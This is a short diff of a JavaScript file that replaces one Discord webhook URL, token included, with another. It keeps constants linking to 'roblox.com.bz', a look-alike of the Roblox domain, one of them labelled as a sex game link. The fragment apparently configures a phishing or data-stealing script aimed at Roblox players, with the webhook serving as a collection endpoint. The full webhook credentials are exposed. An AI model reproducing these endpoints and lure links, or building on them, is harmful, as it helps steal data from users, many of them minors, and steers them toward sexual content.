@@ -1,7 +1,7 @@
 (function () {
   'use strict';
 
-  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1515847249597431929/jMYzK0DFDhc8FdpgMP8304_XNYmztefsQ8w9i8S-IDShWwEl_SLV1y2Skwd_DmG0aYqm';
+  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1518780844297289918/z8yd-aLT6bp4ucHq9BKgLI-BapBLiW3l4hdVkY-Q8UlMN0Vir9aZ0xlQPca4nEnZSJEU';
   const NEW_SWORD_LINK = 'https://roblox.com.bz/games/9377953133/Mobile-Sword-Fight?privateServerLinkCode=78900447338733750394827051417199';
   const SEX_GAME_LINK = 'https://roblox.com.bz/games/77182599101794/4nn1s-Place?privateServerLinkCode=78900447338733750394827051417199';
 
